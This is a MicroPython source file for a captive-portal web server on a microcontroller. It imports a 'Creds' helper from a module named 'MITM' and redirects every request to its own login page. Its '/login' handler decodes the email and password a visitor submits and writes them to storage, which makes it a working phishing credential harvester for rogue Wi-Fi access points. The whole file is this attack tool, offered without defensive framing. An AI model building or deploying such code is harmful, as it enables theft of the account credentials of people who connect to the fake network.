# Import necessary libraries
#import Server
import network
import usocket as socket
import uselect as select
import uerrno
import uio
import gc
import utime
import ujson
import uos
from collections import namedtuple

from MITM import Creds

# Define a named tuple for write connection information
WriteConn = namedtuple("WriteConn", ["body", "buff", "buffmv", "write_range"])
# Define a named tuple for request information
ReqInfo = namedtuple("ReqInfo", ["type", "path", "params", "host"])

# Function to unquote URL-encoded string
def unquote(string):
    """stripped down implementation of urllib.parse unquote_to_bytes"""
    if not string:
        return b''

    if isinstance(string, str):
        string = string.encode('utf-8')

    # split into substrings on each escape character
    bits = string.split(b"%")
    if len(bits) == 1:
        return string  # there was no escape character

    res = [bits[0]]  # everything before the first escape character

    # for each escape character, get the next two digits and convert to UTF-8-encoded byte
    for item in bits[1:]:
        code = item[:2]
        char = bytes([int(code, 16)])  # convert to UTF-8-encoded byte
        res.append(char)  # append the converted character
        res.append(item[2:])  # append anything else that occurred before the next escape character

    return b''.join(res)


# Define the Server class
class Server:
    def __init__(self, poller, port, sock_type, name):
        self.name = name
        # create socket with correct type: stream (TCP) or datagram (UDP)
        self.sock = socket.socket(socket.AF_INET, sock_type)

        # register to get event updates for this socket
        self.poller = poller
        self.poller.register(self.sock, select.POLLIN)

        addr = socket.getaddrinfo("0.0.0.0", port)[0][-1]
        # allow new requests while still sending the last response
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(addr)

        print(self.name, "listening on", addr)

    def stop(self, poller):
        poller.unregister(self.sock)
        self.sock.close()
        print(self.name, "stopped")


# Define the HTTPServer class, which inherits from Server
class HTTPServer(Server):
    def __init__(self, poller, local_ip):
        super().__init__(poller, 80, socket.SOCK_STREAM, "HTTP Server")
        if type(local_ip) is bytes:
            self.local_ip = local_ip
        else:
            self.local_ip = local_ip.encode()
        self.request = dict()
        self.conns = dict()
        self.routes = {b"/": b"./index.html", b"/login": self.login}

        self.ssid = None

        # queue up to 5 connection requests before refusing
        self.sock.listen(5)
        self.sock.setblocking(False)

    def set_ip(self):
        """update settings after connected to local WiFi"""
        self.local_ip = self.local_ip
        #self.ssid = new_ssid
        self.routes = {b"/": self.connected}

    @micropython.native
    def handle(self, sock, event, others):
        if sock is self.sock:
            # client connecting on port 80, so spawn off a new
            # socket to handle this connection
            print("- Accepting new HTTP connection")
            self.accept(sock)
        elif event & select.POLLIN:
            # socket has data to read in
            print("- Reading incoming HTTP data")
            self.read(sock)
        elif event & select.POLLOUT:
            # existing connection has space to send more data
            print("- Sending outgoing HTTP data")
            self.write_to(sock)

    def accept(self, server_sock):
        """accept a new client request socket and register it for polling"""
        try:
            client_sock, addr = server_sock.accept()
        except OSError as e:
            if e.args[0] == uerrno.EAGAIN:
                return

        client_sock.setblocking(False)
        client_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.poller.register(client_sock, select.POLLIN)

    def parse_request(self, req):
        req_lines = req.split(b"\r\n")
        req_type, full_path, http_ver = req_lines[0].split(b" ")
        path = full_path.split(b"?")
        base_path = path[0]
        query = path[1] if len(path) > 1 else None
        query_params = {}
        if query:
            query_params = dict(param.split(b"=") for param in query.split(b"&") if b"=" in param)
        host = next(line.split(b": ")[1] for line in req_lines if b"Host:" in line)
        if host is None:
            return None

        return ReqInfo(req_type, base_path, query_params, host)

    def login(self, params):
        email = unquote(params.get(b"email", None))
        password = unquote(params.get(b"password", None))

        # Write out credentials
        Creds(email=email, password=password).write()

        headers = (
            b"HTTP/1.1 307 Temporary Redirect\r\n"
            b"Location: http://{:s}\r\n".format(self.local_ip)
        )

        return b"", headers
        self.set_ip()

    def connected(self, params):
        headers = b"HTTP/1.1 200 OK\r\n"
        body = open("./error.html", "rb").read() % (self.ssid, self.local_ip)
        return body, headers

    def get_response(self, req):
        """generate a response body and headers, given a route"""
        headers = b"HTTP/1.1 200 OK\r\n"
        route = self.routes.get(req.path, None)

        if type(route) is bytes:
            # expect a filename, so return contents of file
            return open(route, "rb"), headers

        if callable(route):
            # call a function, which may or may not return a response
            response = route(req.params)
            body = response[0] or b""
            headers = response[1] or headers
            return uio.BytesIO(body), headers

        headers = b"HTTP/1.1 404 Not Found\r\n"
        return uio.BytesIO(b""), headers

    def is_valid_req(self, req):
        if req.host != self.local_ip:
            # force a redirect to the MCU's IP address
            return False
        # redirect if we don't have a route for the requested path
        return req.path in self.routes

    def read(self, s):
        """read in client request from socket"""
        data = s.read()
        if not data:
            # no data in the TCP stream, so close the socket
            self.close(s)
            return

        # add new data to the full request
        sid = id(s)
        self.request[sid] = self.request.get(sid, b"") + data

        # check if additional data expected
        if data[-4:] != b"\r\n\r\n":
            # HTTP request is not finished if no blank line at the end
            # wait for the next read event on this socket instead
            return

        # get the completed request
        req = self.parse_request(self.request.pop(sid))

        if not self.is_valid_req(req):
            headers = (
                b"HTTP/1.1 307 Temporary Redirect\r\n"
                b"Location: http://{:s}/\r\n".format(self.local_ip)
            )
            body = uio.BytesIO(b"")
            self.prepare_write(s, body, headers)
            return

        # by this point, we know the request has the correct
        # host and a valid route
        body, headers = self.get_response(req)
        self.prepare_write(s, body, headers)

    def prepare_write(self, s, body, headers):
        # add a newline to headers to signify the transition to the body
        headers += b"\r\n"
        # TCP/IP MSS is 536 bytes, so create a buffer of this size and
        # initially populate it with header data
        buff = bytearray(headers + b"\x00" * (536 - len(headers)))
        # use a memoryview to read directly into the buffer without copying
        buffmv = memoryview(buff)
        # start reading body data into the memoryview starting after
        # the headers and writing at most the remaining space of the buffer
        # return the number of bytes written into the memoryview from the body
        bw = body.readinto(buffmv[len(headers):], 536 - len(headers))
        # save place for the next write event
        c = WriteConn(body, buff, buffmv, [0, len(headers) + bw])
        self.conns[id(s)] = c
        # let the poller know we want to know when it's OK to write
        self.poller.modify(s, select.POLLOUT)

    def write_to(self, sock):
        """write the next message to an open socket"""
        # get the data that needs to be written to this socket
        c = self.conns[id(sock)]
        if c:
            # write the next 536 bytes (max) into the socket
            try:
                bytes_written = sock.write(c.buffmv[c.write_range[0]:c.write_range[1]])
            except OSError:
                print('cannot write to a closed socket')
                return
            if not bytes_written or c.write_range[1] < 536:
                # either we wrote no bytes, or we wrote < TCP MSS of bytes
                # so we're done with this connection
                self.close(sock)
            else:
                # more to write, so read the next portion of the data into
                # the memoryview for the next send event
                self.buff_advance(c, bytes_written)

    def buff_advance(self, c, bytes_written):
        """advance the writer buffer for this connection to the next outgoing bytes"""
        if bytes_written == c.write_range[1] - c.write_range[0]:
            # wrote all the bytes we had buffered into the memoryview
            # set the next write start on the memoryview to the beginning
            c.write_range[0] = 0
            # set the next write end on the memoryview to the length of bytes
            # read in from the remainder of the body, up to TCP MSS
            c.write_range[1] = c.body.readinto(c.buff, 536)
        else:
            # we wrote some, but not all of the bytes in the memoryview
            # we're in the middle of a body write event
            c.write_range[0] += bytes_written
            c.write_range[1] += bytes_written

    def close(self, s):
        """close a socket and cleanup associated state"""
        try:
            self.poller.unregister(s)
            s.close()
        except OSError:
            print('already closed')
        # remove this connection state from our dictionary
        self.conns.pop(id(s), None)


